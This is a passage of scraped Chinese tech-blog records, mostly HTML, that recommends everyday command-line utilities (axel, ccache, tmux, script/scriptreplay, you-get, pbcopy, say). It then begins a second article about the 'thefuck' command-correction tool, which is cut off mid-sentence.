data-line=\"crayon-594b05f185ec8316003213-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f185ec8316003213-1\"><span class=\"crayon-v\">axel</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">http</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//centos.ustc.edu.cn/centos/7/isos/x86_64/CentOS-7-x86_64-Minimal-1511.iso</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1ff8lcc5yl2j20go0eodmg.jpg\" width=\"600\" height=\"528\"></p>\n<p><b><u><a class=\" wrap external\" href=\"https://github.com/mmastrac/iterm2-zmodem\" target=\"_blank\" rel=\"nofollow noreferrer\">sz/rz<i class=\"icon-external\"></i></a>：</u></b>交互式文件传输，在多重跳板机下传输文件非常好用，不用一级一级传输。</p>\n<p><b><a class=\" wrap external\" href=\"http://cloc.sourceforge.net/\" target=\"_blank\" rel=\"nofollow noreferrer\">cloc<i class=\"icon-external\"></i></a>：</b>代码统计工具，能够统计代码的空行数、注释行、编程语言。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1ff8lccg7muj20go05bgmp.jpg\" width=\"600\" height=\"191\"></p>\n<p><b><a class=\" wrap external\" href=\"https://ccache.samba.org/\" target=\"_blank\" rel=\"nofollow noreferrer\">ccache<i class=\"icon-external\"></i></a>：</b>高速C/C++编译缓存工具，反复编译内核非常有用。使用起来也非常方便：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f185ecd723031812\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngcc foo.c</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f185ecd723031812-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f185ecd723031812-1\"><span class=\"crayon-e\">gcc </span><span class=\"crayon-v\">foo</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">c</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>改成:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f185ed0678323433\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nccache gcc foo.c</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f185ed0678323433-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f185ed0678323433-1\"><span class=\"crayon-e\">ccache </span><span class=\"crayon-e\">gcc </span><span class=\"crayon-v\">foo</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">c</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><b>tmux：终端复用工具，替代screen、nohup。</b></p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1ff8lcdhubdj20go0afwic.jpg\" width=\"600\" height=\"375\"></p>\n<div>\n<div>\n<p><a class=\" wrap external\" href=\"https://neovim.io/\" target=\"_blank\" rel=\"nofollow noreferrer\">neovim<i class=\"icon-external\"></i></a>: 替代vim。</p>\n<p><b>script/scriptreplay: </b>终端会话录制。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f185ed4079412925\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nscript -t 2&gt;time.txt session.typescript # 录制开始\r\n# your commands\r\nexit # 录制结束</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f185ed4079412925-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f185ed4079412925-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05f185ed4079412925-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f185ed4079412925-1\"><span class=\"crayon-v\">script</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">t</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">time</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt </span><span class=\"crayon-v\">session</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">typescript</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># 录制开始</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f185ed4079412925-2\"><span class=\"crayon-p\"># your commands</span></div><div class=\"crayon-line\" id=\"crayon-594b05f185ed4079412925-3\"><span class=\"crayon-v\">exit</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># 录制结束</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>回放:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f185ed7157127775\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nscriptreplay -t time.txt session.typescript</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f185ed7157127775-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f185ed7157127775-1\"><span class=\"crayon-v\">scriptreplay</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">t</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">time</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt </span><span class=\"crayon-v\">session</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">typescript</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p><b><a class=\" wrap external\" href=\"https://github.com/soimort/you-get\" target=\"_blank\" rel=\"nofollow noreferrer\">you-get<i class=\"icon-external\"></i></a>: </b>非常强大的媒体下载工具，支持youtube、google+、优酷、芒果TV、腾讯视频、秒拍等视频下载。</p>\n<p>还有mac专有的pbcopy/pbpaste：</p>\n<p>把命令行输出拷贝到系统粘贴板：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f185eda251524497\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncat test.sh| pbcopy</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f185eda251524497-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f185eda251524497-1\"><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">test</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sh</span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pbcopy</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>把系统粘贴板内容拷到终端:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f185edd544241874\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npbpaste</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f185edd544241874-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f185edd544241874-1\"><span class=\"crayon-v\">pbpaste</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>mac下的say命令支持多种语言(英语、普通话、粤语)文本朗读，支持各种销魂恐怖的语气。跑这个命令感受下，小心被吓着了：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f185ee0992440256\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfor i in `say -v '?' | cut -d ' ' -f 1`; do echo $i &amp;&amp; say -v \"$i\" 'Hello World';done</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f185ee0992440256-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f185ee0992440256-1\"><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">say</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'?'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cut</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">' '</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">f</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">do</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">say</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"$i\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'Hello World'</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">done</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>更具体的列表可参考：<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//github.com/int32bit/dotfiles\" target=\"_blank\" rel=\"nofollow noreferrer\">int32bit/dotfiles<i class=\"icon-external\"></i></a> 。</p>\n</div>\n</div>\n<p> </p>\n<h3>伯乐在线补充：</h3>\n<p>知乎原帖中还有另外一个朋友推荐了 <a href=\"https://github.com/nvbn/thefuck\" target=\"_blank\">The Fuck</a>。安装该工具后，在输入命令时如果手抖打错了，会有提醒。见下图：</p>\n<p><img src=\"http://ww2.sinaimg.cn/mw690/6941baebjw1exd7142tfrj20cw09x0w6.jpg\" alt=\"\"></p>\n<p>The Fuck 在 GitHub 上有 26k 多 star，具体如何使用，请看这篇详细介绍：《<a href=\"http://blog.jobbole.com/111096/\" target=\"_blank\">命令行的生活是如此的 F*ck</a>》</p>\n<p>它是如何实现的？请看开发者的文章《<a href=\"http://python.jobbole.com/82528/\" target=\"_blank\">热门 Python 应用 The Fuck 是如何工作的</a>》。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111072\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111072votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111072\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 14 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx2.sinaimg.cn/mw690/63918611gy1ff8lc6lm06j20go0azdig.jpg"], "fav_nums": 14, "comment_nums": 1, "create_date": "2017/05/03", "praise_nums": 2}
{"tags": " 2 评论 ,IT技术,命令行", "front_image_path": "full/d06ceda982fea7eeec79adb8ba276e7c43bc5e1b.jpg", "title": "命令行的生活是如此的 F*ck", "url_object_id": "f989fd54cb808635e522480a575fb6e3", "url": "http://blog.jobbole.com/111096/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://linux.cn/article-8471-1.html\">Linux中国/wxy</a>   </div><p><img id=\"pic\" class=\"\" src=\"http://wx1.sinaimg.cn/large/63918611gy1ff9im31jvbj20p00d2whb.jpg\" width=\"551\" height=\"288\"></p>\n<p>你是不是经常在终端敲错命令，其实这都是因为该死的终端不配合，不能领会你的意思。</p>\n<p>每当这个时候，甚至当你一再敲错的时候，你的内心肯定是崩溃的，一定在默念“……”。</p>\n<p>而现在，是让你的终端觉悟的时候了！</p>\n<p>有位名为 <a href=\"https://twitter.com/liamosaur/\">@liamosaur</a> 的哥们就忍不住对自己的终端发出了愤怒的<a href=\"https://twitter.com/liamosaur/status/506975850596536320\">吼声</a>，并付诸实践：</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx1.sinaimg.cn/large/63918611gy1ff9im8oag0j20hh0bpmyv.jpg\"></p>\n<p>受此启发， 一位名为 <a href=\"https://github.com/nvbn\">Vladimir Iakovlev</a> 程序员对这个该死的终端发出了致命一击！他以及他的 <a href=\"https://github.com/nvbn/thefuck/graphs/contributors\">90 位愤怒的小伙伴们</a>打造出了一个名为 “<a href=\"https://github.com/nvbn/thefuck\">thefuck</a>” 